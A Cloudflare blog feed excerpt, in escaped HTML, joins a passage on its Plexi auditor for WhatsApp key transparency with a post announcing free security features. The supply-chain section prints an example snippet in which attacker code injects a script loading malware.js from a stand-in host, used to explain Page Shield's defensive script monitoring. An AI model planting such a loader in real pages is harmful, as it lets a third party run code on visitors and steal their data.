        &lt;p&gt;With the timestamping service above, WhatsApp users (as well as their Log) have assurance that epochs are transparent. WhatsApp’s directory can be audited at any point in time, and if it were to be tampered with by WhatsApp or an intermediary, the WhatsApp Log can be held accountable for it.&lt;/p&gt;&lt;p&gt;Epochs and their digests are only representations of their underlying key directory. To fully audit the directory, the transition from the previous digest to a current digest has to be validated. To perform validation, we need to run the epoch validation method. Specifically, we want to run &lt;a href="https://github.com/facebook/akd/blob/fcd665aa20f829cd9e06cb3d70cbe0c32ffe6b67/akd/src/auditor.rs#L56"&gt;&lt;u&gt;verify_consecutive_append_only&lt;/u&gt;&lt;/a&gt; on every epoch constructed by the Log. The size of an epoch varies with the number of updates it contains, and therefore the number of associated nodes in the tree to construct as well. While Workers are able to run such validation for a small number of updates, this is a compute-intensive task. Therefore, still leveraging the same Rust codebase, the Auditor leverages a container that only performs the tree construction and validation. The Auditor retrieves the updates for a given epoch, copies them into its own R2 bucket, and delegates the validation to a &lt;a href="https://github.com/cloudflare/workers-sdk/tree/main/packages/wrangler/src/cloudchamber"&gt;&lt;u&gt;container&lt;/u&gt;&lt;/a&gt; running on Cloudflare. Once validated, the epoch is marked as verified.&lt;/p&gt;
            &lt;figure&gt;
            
            &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/5fNbebayPfLZPn4pEIoWpP/b8d2da4ac9867aeb44e9e1ff52405be9/Key_Transparency_Auditor_4_.png" /&gt;
            
            &lt;/figure&gt;&lt;p&gt;&lt;sup&gt;&lt;i&gt;Architecture for Cloudflare’s Plexi Auditor. The proof verification and signatures stored do not contain personally identifiable information such as your phone number, public key, or other metadata tied to your WhatsApp account.&lt;/i&gt;&lt;/sup&gt;&lt;/p&gt;&lt;p&gt;This decouples global uniqueness requirements and epoch validation, which happens at two distinct times. It allows the validation to take more time, and not be latency sensitive.&lt;/p&gt;
          &lt;div&gt;
            &lt;h2&gt;How can I verify Cloudflare has signed an epoch?&lt;/h2&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#how-can-i-verify-cloudflare-has-signed-an-epoch"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
          &lt;p&gt;Anyone can perform audit proof verification — &lt;a href="https://dash.key-transparency.cloudflare.com"&gt;&lt;u&gt;the proofs are publicly available&lt;/u&gt;&lt;/a&gt; — but Cloudflare will be doing so automatically and publicly to make the results accessible to all. Verify that Cloudflare’s signature matches WhatsApp’s by visiting our &lt;a href="https://dash.key-transparency.cloudflare.com"&gt;&lt;u&gt;Key Transparency website&lt;/u&gt;&lt;/a&gt;, or via our &lt;a href="https://github.com/cloudflare/plexi"&gt;&lt;u&gt;command line&lt;/u&gt;&lt;/a&gt; tool.&lt;/p&gt;&lt;p&gt;To use our command line tool, you’ll need to download the &lt;a href="https://github.com/cloudflare/plexi"&gt;&lt;u&gt;plexi&lt;/u&gt;&lt;/a&gt; client. It helps construct data structures which are used for signatures, and requires you to have git and cargo installed.&lt;/p&gt;
            &lt;pre&gt;&lt;code&gt;cargo install plexi&lt;/code&gt;&lt;/pre&gt;
            &lt;p&gt;With the client installed, let’s now check the audit proofs for WhatsApp namespace: &lt;code&gt;whatsapp.key-transparency.v1&lt;/code&gt;. Plexi Auditor is represented by one public key, which can verify and vouch for multiple Logs with their own dedicated “namespace.” To validate an epoch, such as epoch 458298 (the epoch at which the log decided to start sharing data), you can run the following command:&lt;/p&gt;
            &lt;pre&gt;&lt;code&gt;plexi audit --remote-url 'https://akd-auditor.cloudflare.com' --namespace 'whatsapp.key-transparency.v1' --long

  Proof verification	: success&lt;/code&gt;&lt;/pre&gt;

            &lt;h2&gt;Interested in having Cloudflare audit your public key infrastructure?&lt;/h2&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#interested-in-having-cloudflare-audit-your-public-key-infrastructure"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
          &lt;p&gt;At the end of the day, security threats shouldn’t become usability problems — everyday messaging app users shouldn’t have to worry about whether the public keys of the people they’re talking to have been compromised. In the same way that &lt;a href="https://ct.cloudflare.com/"&gt;&lt;u&gt;certificate transparency&lt;/u&gt;&lt;/a&gt; is now built into the issuance and use of digital certificates to encrypt web traffic, we think that public key transparency and auditing should be built into end-to-end encrypted systems by default, so that users never have to do manual QR code verification again. &lt;/p&gt;&lt;p&gt;We built our auditing service to be general purpose, reliable, and fast, and WhatsApp’s Key Transparency is just the first of several use cases it will be used for – Cloudflare is interested in helping audit the delivery of code binaries and integrity of all types of end-to-end encrypted infrastructure.

Today we are providing threat intelligence and more than 10 new security features for free to all of our customers. Whether you are using Cloudflare to &lt;a href="https://www.cloudflare.com/learning/security/glossary/website-security-checklist/"&gt;protect your website&lt;/a&gt;, your home network, or your office, you will find something useful that you can start using with just a few clicks.&lt;/p&gt;&lt;p&gt;These features are focused around some of the largest growing concerns in cybersecurity, including &lt;a href="https://www.cloudflare.com/zero-trust/solutions/account-takeover-prevention/"&gt;&lt;u&gt;account takeover attacks&lt;/u&gt;&lt;/a&gt;, &lt;a href="https://blog.cloudflare.com/tag/supply-chain-attacks/"&gt;&lt;u&gt;supply chain attacks&lt;/u&gt;&lt;/a&gt;, &lt;a href="https://www.cloudflare.com/learning/security/api/what-is-api-security/"&gt;&lt;u&gt;attacks against API endpoints&lt;/u&gt;&lt;/a&gt;, &lt;a href="https://www.cloudflare.com/network-services/products/magic-network-monitoring/"&gt;&lt;u&gt;network visibility&lt;/u&gt;&lt;/a&gt;, and &lt;a href="https://www.cloudflare.com/learning/access-management/what-is-dlp/"&gt;&lt;u&gt;data leaks from your network&lt;/u&gt;&lt;/a&gt;.&lt;/p&gt;
          &lt;div&gt;
            &lt;h2&gt;More security for everyone&lt;/h2&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#more-security-for-everyone"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
          &lt;p&gt;You can read more about each one of these features in the sections below, but we wanted to provide a short summary upfront.&lt;/p&gt;&lt;p&gt;&lt;b&gt;If you are a cyber security enthusiast: &lt;/b&gt;you can head over to our &lt;a href="http://cloudflare.com/threat-intelligence/"&gt;&lt;u&gt;new Cloudforce One threat intelligence website&lt;/u&gt;&lt;/a&gt; to find out about threat actors, attack campaigns, and other Internet-wide security issues.&lt;/p&gt;&lt;p&gt;&lt;b&gt;If you are a website owner&lt;/b&gt;: starting today, all free plans will get access to &lt;a href="https://developers.cloudflare.com/waf/analytics/security-analytics/"&gt;&lt;u&gt;Security Analytics&lt;/u&gt;&lt;/a&gt; for their zones. Additionally, we are also making &lt;a href="https://developers.cloudflare.com/dns/additional-options/analytics/"&gt;&lt;u&gt;DNS Analytics&lt;/u&gt;&lt;/a&gt; available to everyone via GraphQL.&lt;/p&gt;&lt;p&gt;Once you have visibility, it’s all about distinguishing good from malicious traffic. All customers get access to always-on &lt;a href="https://developers.cloudflare.com/waf/managed-rules/check-for-exposed-credentials/"&gt;&lt;u&gt;account takeover attack detection&lt;/u&gt;&lt;/a&gt;, &lt;a href="https://developers.cloudflare.com/api-shield/security/schema-validation/"&gt;&lt;u&gt;API schema validation&lt;/u&gt;&lt;/a&gt; to enforce a positive security model on their API endpoints, and &lt;a href="https://developers.cloudflare.com/page-shield/detection/monitor-connections-scripts/"&gt;&lt;u&gt;Page Shield script monitor&lt;/u&gt;&lt;/a&gt; to provide visibility into the third party assets that you are loading from your side and that could be used to perform supply chain-based attacks.&lt;/p&gt;&lt;p&gt;&lt;b&gt;If you are using Cloudflare to protect your people and network&lt;/b&gt;: We are going to bundle a number of our Cloudflare One products into a new free offering. This bundle will include the current &lt;a href="https://www.cloudflare.com/plans/zero-trust-services/"&gt;&lt;u&gt;Zero Trust products we offer for free&lt;/u&gt;&lt;/a&gt;, and new products like &lt;a href="https://www.cloudflare.com/network-services/products/magic-network-monitoring/"&gt;&lt;u&gt;Magic Network Monitoring&lt;/u&gt;&lt;/a&gt; for network visibility, &lt;a href="https://www.cloudflare.com/learning/access-management/what-is-dlp/"&gt;&lt;u&gt;Data Loss Prevention&lt;/u&gt;&lt;/a&gt; for sensitive data, and &lt;a href="https://www.cloudflare.com/learning/performance/what-is-digital-experience-monitoring/"&gt;&lt;u&gt;Digital Experience Monitoring&lt;/u&gt;&lt;/a&gt; for measuring network connectivity and performance. Cloudflare is the only vendor to offer free versions of these types of products.&lt;/p&gt;&lt;p&gt;&lt;b&gt;If you are a new user: &lt;/b&gt;We have new options for authentication. Starting today, we are introducing the option to use Google Authentication to sign up and log into Cloudflare, which will make it easier for some of our customers to login, and reduce dependence on remembering passwords, consequently reducing the risk of their Cloudflare account becoming compromised.&lt;/p&gt;&lt;p&gt;And now in more detail:&lt;/p&gt;
          &lt;div&gt;
            &lt;h2&gt;Threat Intelligence &amp;amp; Analytics&lt;/h2&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#threat-intelligence-analytics"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
          
          &lt;div&gt;
            &lt;h3&gt;Cloudforce One&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#cloudforce-one"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;Our threat research and operations team, &lt;a href="https://blog.cloudflare.com/introducing-cloudforce-one-threat-operations-and-threat-research/"&gt;&lt;u&gt;Cloudforce One&lt;/u&gt;&lt;/a&gt;, is excited to announce the launch of a &lt;a href="http://cloudflare.com/threat-intelligence/"&gt;&lt;u&gt;freely accessible dedicated threat intelligence website&lt;/u&gt;&lt;/a&gt;. We will use this site to publish both technical and executive-oriented information on the latest threat actor activity and tactics, as well as insights on emerging malware, vulnerabilities, and attacks.&lt;/p&gt;&lt;p&gt;We are also publishing two new pieces of threat intelligence, along with a promise for more. Head over to the &lt;a href="http://cloudflare.com/threat-intelligence/"&gt;&lt;u&gt;new website&lt;/u&gt;&lt;/a&gt; here to see the latest research, covering an advanced threat actor targeting regional organizations across South and East Asia, as well as the rise of double brokering freight fraud. Future research and data sets will also become available as a new&lt;a href="https://developers.cloudflare.com/security-center/indicator-feeds/"&gt; &lt;u&gt;Custom Indicator Feed&lt;/u&gt;&lt;/a&gt;&lt;u&gt; &lt;/u&gt;for customers.&lt;/p&gt;&lt;p&gt;&lt;a href="http://cloudflare.com/threat-intelligence/"&gt;&lt;u&gt;Subscribe&lt;/u&gt;&lt;/a&gt; to receive email notifications of future threat research.&lt;/p&gt;
          &lt;div&gt;
            &lt;h3&gt;Security Analytics&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#security-analytics"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;Security Analytics gives you a security lens across &lt;b&gt;all&lt;/b&gt; of your HTTP traffic, not only mitigated requests, allowing you to focus on what matters most: traffic deemed malicious but potentially not mitigated. This means that, in addition to using Security Events to view security actions taken by our Application Security suite of products, you can use Security Analytics to review all of your traffic for anomalies or strange behavior and then use the insights gained to craft precise mitigation rules based on your specific traffic patterns. Starting today, we are making this lens available to customers across all plans.&lt;/p&gt;&lt;p&gt;Free and Pro plan users will now have access to &lt;a href="https://dash.cloudflare.com/?to=/:account/:zone/security/analytics"&gt;&lt;u&gt;a new dashboard&lt;/u&gt;&lt;/a&gt; for Security Analytics where you can view a high level overview of your traffic in the Traffic Analysis chart, including the ability to group and filter so that you can zero in on anomalies with ease. You can also see top statistics and filter across a variety of dimensions, including countries, source browsers, source operating systems, HTTP versions, SSL protocol version, cache status, and security actions.&lt;/p&gt;

          &lt;/figure&gt;
          &lt;div&gt;
            &lt;h3&gt;DNS Analytics&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#dns-analytics"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;Every user on Cloudflare now has access to &lt;a href="https://dash.cloudflare.com/?to=/:account/:zone/dns/analytics"&gt;&lt;u&gt;the new and improved DNS Analytics dashboard&lt;/u&gt;&lt;/a&gt; as well as access to the new DNS Analytics dataset in our &lt;a href="https://developers.cloudflare.com/analytics/graphql-api/"&gt;&lt;u&gt;powerful GraphQL API&lt;/u&gt;&lt;/a&gt;. Now, you can easily analyze the DNS queries to your domain(s), which can be useful for troubleshooting issues, detecting patterns and trends, or generating usage reports by applying powerful filters and breaking out DNS queries by source.&lt;/p&gt;&lt;p&gt;With the &lt;a href="https://blog.cloudflare.com/foundation-dns-launch"&gt;&lt;u&gt;launch of Foundation DNS&lt;/u&gt;&lt;/a&gt;, we introduced new DNS Analytics based on GraphQL, but these analytics were previously only available for zones using &lt;a href="https://developers.cloudflare.com/dns/foundation-dns/advanced-nameservers/"&gt;&lt;u&gt;advanced nameservers&lt;/u&gt;&lt;/a&gt;. However, due to the deep insight these analytics provide, we felt this feature was something we should make available to everyone. Starting today, the new DNS Analytics based on GraphQL can be accessed on every zone using Cloudflare’s Authoritative DNS service under Analytics in the DNS section.&lt;/p&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/3LJ4aIFB4pHhHtWeWzYlgV/96c701d7c826a92e1220c7cd85f40f88/image5.png" /&gt;
          &lt;/figure&gt;
          &lt;div&gt;
            &lt;h2&gt;Application threat detection and mitigation&lt;/h2&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#application-threat-detection-and-mitigation"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
          
          &lt;div&gt;
            &lt;h3&gt;Account takeover detection&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#account-takeover-detection"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;&lt;a href="https://techreport.com/statistics/cybersecurity/password-reuse-statistics/"&gt;&lt;u&gt;65% of Internet users&lt;/u&gt;&lt;/a&gt; are vulnerable to account takeover (ATO) due to password reuse and the rising frequency of large data breaches. Helping build a better Internet involves making critical account protection easy and accessible for everyone.&lt;/p&gt;&lt;p&gt;Starting today, we’re providing robust account security that helps prevent credential stuffing and other ATO attacks to everyone for free — from individual users to large enterprises — making enhanced features like Leaked Credential Checks and ATO detections available at no cost. &lt;/p&gt;&lt;p&gt;These updates include automatic detection of logins, brute force attack prevention with minimal setup, and access to a comprehensive leaked credentials database of over 15 billion passwords which will contain leaked passwords from the &lt;a href="https://haveibeenpwned.com/"&gt;&lt;u&gt;Have I been Pwned (HIBP)&lt;/u&gt;&lt;/a&gt; service in addition to our own database. Customers can take action on the leaked credential requests through Cloudflare’s WAF features like &lt;a href="https://developers.cloudflare.com/waf/rate-limiting-rules"&gt;&lt;u&gt;Rate Limiting Rules&lt;/u&gt;&lt;/a&gt; and &lt;a href="https://developers.cloudflare.com/waf/custom-rules/"&gt;&lt;u&gt;Custom Rules&lt;/u&gt;&lt;/a&gt;, or they can take action at the origin by enforcing &lt;a href="https://www.cloudflare.com/learning/access-management/what-is-multi-factor-authentication/"&gt;&lt;u&gt;multi-factor authentication (MFA)&lt;/u&gt;&lt;/a&gt; or requiring a password reset based on a header sent to the origin.&lt;/p&gt;&lt;p&gt;Setup is simple: Free plan users get automatic detections, while paid users can activate the new features via one click in the Cloudflare dashboard. For more details on setup and configuration, refer to our &lt;a href="https://developers.cloudflare.com/waf/detections/leaked-credentials/"&gt;&lt;u&gt;documentation&lt;/u&gt;&lt;/a&gt; and use it today!&lt;/p&gt;
          &lt;div&gt;
            &lt;h3&gt;API schema validation&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#api-schema-validation"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;API traffic &lt;a href="https://www.cloudflare.com/2024-api-security-management-report/"&gt;&lt;u&gt;comprises more than half&lt;/u&gt;&lt;/a&gt; of the dynamic traffic on the Cloudflare network. The popularity of APIs has opened up a whole new &lt;a href="https://cyware.com/news/unprotected-database-belonging-to-justdial-exposes-personal-information-of-almost-100-million-users-1d5bb7a9"&gt;&lt;u&gt;set&lt;/u&gt;&lt;/a&gt; of &lt;a href="https://venturebeat.com/security/t-mobile-data-breach-shows-api-security-cant-be-ignored/"&gt;&lt;u&gt;attack&lt;/u&gt;&lt;/a&gt; &lt;a href="https://venturebeat.com/security/twitter-breach-api-attack/"&gt;&lt;u&gt;vectors&lt;/u&gt;&lt;/a&gt;. Cloudflare API Shield’s &lt;a href="https://developers.cloudflare.com/api-shield/security/schema-validation/"&gt;&lt;u&gt;Schema Validation&lt;/u&gt;&lt;/a&gt; is the first step to &lt;a href="https://blog.cloudflare.com/api-gateway/"&gt;&lt;u&gt;strengthen&lt;/u&gt;&lt;/a&gt; your API security in the face of these new threats.&lt;/p&gt;&lt;p&gt;Now for the first time, &lt;i&gt;any&lt;/i&gt; Cloudflare customer can use Schema Validation to ensure only valid requests to their API make it through to their origin.&lt;/p&gt;&lt;p&gt;This functionality stops accidental information disclosure due to bugs, stops developers from haphazardly exposing endpoints through a non-standard process, and automatically blocks zombie APIs as your API inventory is kept up-to-date as part of your CI/CD process.&lt;/p&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/3PMaRYLTwff6D7sdXRysJ7/728deb51cbec996c6741c428639b6900/image2.png" /&gt;
          &lt;/figure&gt;&lt;p&gt;We suggest you use Cloudflare’s &lt;a href="https://developers.cloudflare.com/api/operations/api-shield-schema-validation-post-schema"&gt;&lt;u&gt;API&lt;/u&gt;&lt;/a&gt; or Terraform &lt;a href="https://developers.cloudflare.com/api-shield/reference/terraform/"&gt;&lt;u&gt;provider&lt;/u&gt;&lt;/a&gt; to add endpoints to Cloudflare API Shield and update the schema after your code’s been released as part of your post-build CI/CD process. That way, API Shield becomes a go-to API inventory tool, and &lt;a href="https://developers.cloudflare.com/api-shield/security/schema-validation/"&gt;&lt;u&gt;Schema Validation&lt;/u&gt;&lt;/a&gt; will take care of requests towards your API that you aren’t expecting.&lt;/p&gt;&lt;p&gt;While APIs are all about integrating with third parties, sometimes integrations are done by loading libraries directly into your application. Next up, we’re helping secure more of the web by protecting users from malicious third party scripts that steal sensitive information from inputs on your pages.&lt;/p&gt;
          &lt;div&gt;
            &lt;h3&gt;Supply chain attack prevention&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#supply-chain-attack-prevention"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;Modern web apps improve their users’ experiences and cut down on developer time through the use of third party JavaScript libraries. Because of its privileged access level to everything on the page, a compromised third party JavaScript library can surreptitiously &lt;a href="https://www.cloudflare.com/learning/security/what-is-data-exfiltration/"&gt;exfiltrate sensitive information&lt;/a&gt; to an attacker without the end user or site administrator realizing it’s happened.&lt;/p&gt;&lt;p&gt;To counter this threat, we introduced Page Shield &lt;a href="https://blog.cloudflare.com/introducing-page-shield/"&gt;&lt;u&gt;three years ago&lt;/u&gt;&lt;/a&gt;. We are now releasing Page Shield’s Script Monitor for free to all our users.&lt;/p&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/5b6sxHcCLgIAHfb6Qub6NR/ae2f22ed1d2126804a5bc6e333d64fed/image3.png" /&gt;
          &lt;/figure&gt;&lt;p&gt;With &lt;a href="https://dash.cloudflare.com/?to=/:account/:zone/security/page-shield"&gt;&lt;u&gt;Script Monitor&lt;/u&gt;&lt;/a&gt;, you’ll see &lt;i&gt;all&lt;/i&gt; JavaScript assets loaded on the page, not just the ones your developers included. This visibility includes scripts dynamically loaded by other scripts! Once an attacker compromises the library, it is trivial to add a new malicious script without changing the context of the original HTML by instead including new code in the existing included JavaScript asset:&lt;/p&gt;
            &lt;pre&gt;&lt;code&gt;// Original library code (trusted)
function someLibraryFunction() {
    // useful functionality here
}

// Malicious code added by the attacker
let malScript = document.createElement('script');
malScript.src = 'https://example.com/malware.js';
document.body.appendChild(malScript);&lt;/code&gt;&lt;/pre&gt;
            &lt;p&gt;Script Monitor was essential when the &lt;a href="https://blog.cloudflare.com/polyfill-io-now-available-on-cdnjs-reduce-your-supply-chain-risk"&gt;&lt;u&gt;news broke of the pollyfill.io library&lt;/u&gt;&lt;/a&gt; changing ownership. Script Monitor users had immediate visibility to the scripts loaded on their sites and could quickly and easily understand if they were at risk.&lt;/p&gt;&lt;p&gt;We’re happy to extend visibility of these scripts to as much of the web as we can by releasing Script Monitor for all customers. Find out how you can get started &lt;a href="https://developers.cloudflare.com/page-shield/detection/monitor-connections-scripts/"&gt;&lt;u&gt;here in the docs&lt;/u&gt;&lt;/a&gt;.&lt;/p&gt;&lt;p&gt;Existing users of Page Shield can immediately filter on the monitored data, knowing whether polyfill.io (or any other library) is used by their app. In addition, we &lt;a href="https://blog.cloudflare.com/automatically-replacing-polyfill-io-links-with-cloudflares-mirror-for-a-safer-internet/"&gt;&lt;u&gt;built a polyfill.io rewrite&lt;/u&gt;&lt;/a&gt; in response to the compromised service, which was automatically enabled for Free plans in June 2024.&lt;/p&gt;
          &lt;div&gt;
            &lt;h3&gt;Turnstile as a Google Firebase extension &lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#turnstile-as-a-google-firebase-extension"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;We're excited to announce the &lt;a href="https://developers.cloudflare.com/turnstile/extensions/google-firebase/"&gt;&lt;u&gt;Cloudflare Turnstile App Check Provider for Google Firebase&lt;/u&gt;&lt;/a&gt;, which offers seamless integration without the need for manual setup. This new extension allows developers building mobile or web applications on Firebase to protect their projects from bots using Cloudflare’s CAPTCHA alternative. By leveraging Turnstile's bot detection and challenge capabilities, you can ensure that only authentic human visitors interact with your Firebase backend services, enhancing both security and user experience. Cloudflare Turnstile, a privacy-focused CAPTCHA alternative, differentiates between humans and bots without disrupting the user experience. Unlike traditional CAPTCHA solutions, which users often abandon, Turnstile operates invisibly and provides various modes to ensure frictionless user interactions.&lt;/p&gt;&lt;p&gt;The Firebase App Check extension for Turnstile is easy to integrate, allowing developers to quickly enhance app security with minimal setup. This extension is also free with unlimited usage with Turnstile’s free tier. By combining the strengths of Google Firebase's backend services and Cloudflare’s Turnstile, developers can offer a secure and seamless experience for their users. &lt;/p&gt;
          &lt;div&gt;
            &lt;h2&gt;Cloudflare One&lt;/h2&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#cloudflare-one"&gt;

          &lt;/div&gt;
          &lt;p&gt;&lt;a href="https://www.cloudflare.com/zero-trust/"&gt;&lt;u&gt;Cloudflare One&lt;/u&gt;&lt;/a&gt; is a comprehensive &lt;a href="https://www.cloudflare.com/learning/access-management/what-is-sase/"&gt;&lt;u&gt;Secure Access Service Edge (SASE)&lt;/u&gt;&lt;/a&gt; platform designed to protect and connect people, apps, devices, and networks across the Internet. It combines services such as Zero Trust Network Access (ZTNA), Secure Web Gateway (SWG), and more into a single solution. Cloudflare One can help everyone secure people and networks, manage access control, protect against cyber threats, safeguard their data, and improve the performance of network traffic by routing it through Cloudflare’s global network. It replaces traditional security measures by offering a cloud-based approach to secure and streamline access to corporate resources.&lt;/p&gt;&lt;p&gt;Everyone now has free access to four new products that have been added to Cloudflare One over the past two years:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;p&gt;&lt;a href="https://www.cloudflare.com/learning/access-management/what-is-a-casb/"&gt;&lt;u&gt;Cloud Access Security Broker (CASB)&lt;/u&gt;&lt;/a&gt; for mitigating SaaS application risk&lt;i&gt;.&lt;/i&gt;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;a href="https://www.cloudflare.com/learning/access-management/what-is-dlp/"&gt;&lt;u&gt;Data Loss Prevention (DLP)&lt;/u&gt;&lt;/a&gt; for protecting sensitive data from leaving your network and SaaS applications&lt;i&gt;.&lt;/i&gt;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;a href="https://www.cloudflare.com/learning/performance/what-is-digital-experience-monitoring/"&gt;&lt;u&gt;Digital Experience Monitoring&lt;/u&gt;&lt;/a&gt; for seeing a user’s experience when they are on any network.&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;a href="https://www.cloudflare.com/network-services/products/magic-network-monitoring/"&gt;&lt;u&gt;Magic Network Monitoring&lt;/u&gt;&lt;/a&gt; for seeing all the traffic that flows through your network&lt;i&gt;.&lt;/i&gt;&lt;/p&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;This is in addition to the existing network security products already in the Cloudflare One platform:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;p&gt;&lt;a href="https://www.cloudflare.com/learning/access-management/what-is-ztna/"&gt;&lt;u&gt;Access&lt;/u&gt;&lt;/a&gt; for verifying users’ identity and only letting them use the applications they’re meant to be using.&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;a href="https://www.cloudflare.com/learning/access-management/what-is-a-secure-web-gateway/"&gt;&lt;u&gt;Gateway&lt;/u&gt;&lt;/a&gt; for protecting network traffic that both goes out to the public Internet and into your private network.&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;a href="https://developers.cloudflare.com/cloudflare-one/connections/connect-networks/"&gt;&lt;u&gt;Cloudflare Tunnel&lt;/u&gt;&lt;/a&gt;, our app connectors, which includes both cloudflared and WARP Connector for connecting different applications, servers, and private networks to Cloudflare’s network.&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;a href="https://developers.cloudflare.com/cloudflare-one/connections/connect-devices/warp/"&gt;&lt;u&gt;Cloudflare WARP&lt;/u&gt;&lt;/a&gt;, our device agent, for securely sending traffic from a laptop or mobile device to the Internet.&lt;/p&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;Anyone with a Cloudflare account will automatically receive 50 free seats across all of these products in their Cloudflare One organization.

            &lt;h2&gt;Authenticating with Google&lt;/h2&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#authenticating-with-google"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
          &lt;p&gt;The Cloudflare dashboard itself has become a vital resource that needs to be protected, and we spend a lot of time ensuring Cloudflare user accounts do not get compromised.&lt;/p&gt;&lt;p&gt;To do this, we have increased security by adding additional authentication methods including app-based two-factor authentication (2FA), passkeys, SSO, and Sign in with Apple. Today we’re adding the ability to sign up and sign in with a Google account.&lt;/p&gt;&lt;p&gt;Cloudflare supports several authentication workflows tailored to different use cases. While SSO and passkeys are the preferred and most secure methods of authentication, we believe that providing authentication factors that are stronger than passwords will fill a gap and raise overall average security for our users. Signing in with Google makes life easier for our users and prevents them from having to remember yet another password when they’re already browsing the web with a Google identity.&lt;/p&gt;&lt;p&gt;Sign in with Google is based on the &lt;a href="https://oauth.net/2/"&gt;&lt;u&gt;OAuth 2.0&lt;/u&gt;&lt;/a&gt; specification, and allows Google to securely share identifying information about a given identity while ensuring that it is Google providing this information, preventing any malicious entities from impersonating Google.&lt;/p&gt;&lt;p&gt;This means that we can delegate authentication to Google, preventing zero knowledge attacks directly on this Cloudflare identity.&lt;/p&gt;&lt;p&gt;Upon coming to the Cloudflare Sign In page, you will be presented with the button below. Clicking on it will allow you to register for Cloudflare, and once you are registered, it will allow you to sign in without typing in a password, using any existing protections you have set on your Google account.&lt;/p&gt;
            &lt;figure&gt;

            &lt;/figure&gt;&lt;p&gt;With the launch of this capability, Cloudflare now uses its own Cloudflare Workers to provide an abstraction layer for &lt;a href="https://openid.net/developers/how-connect-works/"&gt;&lt;u&gt;OIDC&lt;/u&gt;&lt;/a&gt;-compatible identity providers (such as GitHub and Microsoft accounts), which means our users can expect to see more &lt;a href="https://www.cloudflare.com/learning/access-management/what-is-an-identity-provider/"&gt;&lt;u&gt;identity provider (IdP)&lt;/u&gt;&lt;/a&gt; connection support coming in the future.&lt;/p&gt;&lt;p&gt;At this time, only new customers signing up with Google will be able to sign in with their Google account, but we will be implementing this for more of our users going forward, with the ability to link/de-link social login providers, and we will be adding additional social login methods. Enterprise users with an established SSO setup will not be able to use this method at this time, and those with an established SSO setup based on Google Workspace will be forwarded to their SSO flow, as we consider how to streamline the Access and IdP policies that have been set up to lock down your Cloudflare environment.&lt;/p&gt;&lt;p&gt;If you are new to Cloudflare, and have a Google account, it is easier than ever to start using Cloudflare to protect your websites, build a new service, or try any of the other services that Cloudflare provides.&lt;/p&gt;

          &lt;/div&gt;
          &lt;p&gt;One of Cloudflare’s goals has always been to democratize cyber security tools, so everyone can provide content and connect to the Internet safely, even without the resources of large enterprise organizations.&lt;/p&gt;&lt;p&gt;We have decided to provide a large set of new features for free to all Cloudflare users, covering a wide range of security use cases, for web administrators, network administrators, and cyber security enthusiasts.&lt;/p&gt;&lt;p&gt;&lt;a href="https://dash.cloudflare.com/"&gt;&lt;u&gt;Log in to your Cloudflare account&lt;/u&gt;&lt;/a&gt; to start taking advantage of these announcements today.

            &lt;h3&gt;A committed journey of privacy and security&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#a-committed-journey-of-privacy-and-security"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
